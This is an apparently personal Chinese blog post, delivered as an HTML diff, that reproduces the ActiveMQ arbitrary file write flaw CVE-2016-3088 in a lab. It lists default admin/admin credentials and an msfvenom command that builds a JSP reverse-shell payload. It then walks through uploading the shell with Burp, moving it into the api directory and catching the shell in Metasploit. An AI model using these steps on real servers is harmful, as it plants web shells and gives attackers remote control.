@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    ActiveMQ 任意文件写入漏洞（CVE-2016-3088） |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/technology.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-AQ" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ActiveMQ 任意文件写入漏洞（CVE-2016-3088）
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/07/03/AQ/" class="article-date">
+  <time datetime="2019-07-03T07:05:18.000Z" itemprop="datePublished">2019-07-03</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞渗透/">漏洞渗透</a>
+  </div>
+
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <hr>
+<h1 id="ActiveMQ-任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ-任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ 任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ 任意文件写入漏洞（CVE-2016-3088）</h1><p>写 shell 的话，需要写在 admin 或者 api 中，也就是需要登录，没有密码的话完成不了写 shell 操作。<br>该环境默认的口令为 admin/admin。<br>访问 <a href="http://127.0.0.1:8161/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://127.0.0.1:8161/admin/test/systemProperties.jsp</a></p>
+<p>2.上传 jsp 小马，返回204，但是在 fileserver 路径下不解析<br>本人用msf生成的<br>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.199.117 lport=9999 R &gt;shell.jsp<br><a href="https://imgchr.com/i/mESrtA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mESrtA.png" alt="mESrtA.png"></a><br>访问这个网址，用burp拦截<br><a href="https://imgchr.com/i/mESh7Q" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mESh7Q.png" alt="mESh7Q.png"></a><br>把生成的木马内容放到拦截的内容下，上传成功会显示204（如图）<br>&emsp;<br><a href="https://imgchr.com/i/mEpC1x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEpC1x.png" alt="mEpC1x.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mEpMgP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEpMgP.png" alt="mEpMgP.png"></a><br>然后访问如图IP，看成功没<br><a href="https://imgchr.com/i/mEp6UJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEp6UJ.png" alt="mEp6UJ.png"></a><br>然后移动到 api 目录下，成功的话，返回 204 No Content<br><a href="https://imgchr.com/i/mEpfv6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEpfv6.png" alt="mEpfv6.png"></a><br>然后访问看有没有成功,然后点击，kali进行监听<br><a href="https://imgchr.com/i/mEpTVe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEpTVe.png" alt="mEpTVe.png"></a><br>添加监听模块和payload<br><a href="https://imgchr.com/i/mE9C5j" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9C5j.png" alt="mE9C5j.png"></a><br>添加端口和自己IP<br><a href="https://imgchr.com/i/mE9Ax0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9Ax0.png" alt="mE9Ax0.png"></a><br>开始监听，可以输入命令就成功了<br><a href="https://imgchr.com/i/mE9JsK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE9JsK.png" alt="mE9JsK.png"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/07/03/AQ/" data-id="cjzcb24uc0000i4v6yjsyuozv"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ActiveMQ-任意文件写入漏洞（CVE-2016-3088）/">ActiveMQ 任意文件写入漏洞（CVE-2016-3088）</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/07/03/appweb/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Appweb(CVE-2018-8715)漏洞复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/technology.js"></script>
+
+  </div>
+</body>
+</html>
